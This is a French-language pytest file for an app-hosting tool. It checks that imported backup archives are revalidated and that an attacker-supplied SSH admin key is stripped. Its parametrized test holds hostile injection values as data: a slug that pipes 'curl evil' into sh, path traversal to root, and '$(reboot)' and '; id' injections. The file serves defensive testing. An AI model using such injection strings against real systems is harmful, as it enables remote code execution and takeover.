"""Archives importées : rien n'est sûr, tout est revalidé (faille C-1 de l'audit : identifiant piégé → root)."""
import io
import json
import tarfile

import pytest

from app import backup


def _archive(tmp_path, manifest):
    path = tmp_path / "hangar-test.tar.gz"
    raw = json.dumps(manifest).encode()
    with tarfile.open(path, "w:gz") as tar:
        info = tarfile.TarInfo("manifest.json")
        info.size = len(raw)
        tar.addfile(info, io.BytesIO(raw))
    return str(path)


def _entree(**kw):
    e = {"slug": "jeu", "name": "Jeu", "source": "image", "image": "ghcr.io/x/jeu", "version": "1.0.0",
         "port": 8080, "mem_mb": 256, "health_path": "/health", "env": "", "db": 1, "desired": "running"}
    e.update(kw)
    return e


def test_archive_valide(tmp_path):
    m = backup.read_manifest(_archive(tmp_path, {"format": 2, "apps": [_entree()]}))
    assert [a["slug"] for a in m["apps"]] == ["jeu"]


@pytest.mark.parametrize("piege", [
    {"slug": "x; curl evil|sh"}, {"slug": "../../root"}, {"image": "x/y; id"}, {"version": "$(reboot)"},
    {"port": "8080; id"}, {"env": "PAS UNE LIGNE"},
])
def test_archive_piegee_refusee(tmp_path, piege):
    with pytest.raises(ValueError, match="archive refusée"):
        backup.read_manifest(_archive(tmp_path, {"format": 2, "apps": [_entree(**piege)]}))


def test_fichier_quelconque_refuse(tmp_path):
    p = tmp_path / "x.tar.gz"
    p.write_bytes(b"pas une archive")
    with pytest.raises(ValueError):
        backup.read_manifest(str(p))
    with pytest.raises(ValueError):
        backup.read_manifest(_archive(tmp_path, {"format": 99, "apps": []}))


def test_politique_de_securite_sans_cles(tmp_path):
    sec = {"ssh_mode": "open", "ssh_passwords": False, "admin_keys": ["ssh-ed25519 AAAAC3Nza attaquant"]}
    m = backup.read_manifest(_archive(tmp_path, {"format": 2, "apps": [_entree()], "settings": {"security": sec}}))
    assert m["settings"]["security"]["admin_keys"] == []
    assert m["settings"]["security"]["ssh_passwords"] is False


def test_politique_invalide_ignoree(tmp_path):
    sec = {"ssh_mode": "restricted", "ssh_sources": ["pas-une-ip"]}
    m = backup.read_manifest(_archive(tmp_path, {"format": 2, "apps": [_entree()], "settings": {"security": sec}}))
    assert not (m["settings"] or {}).get("security")
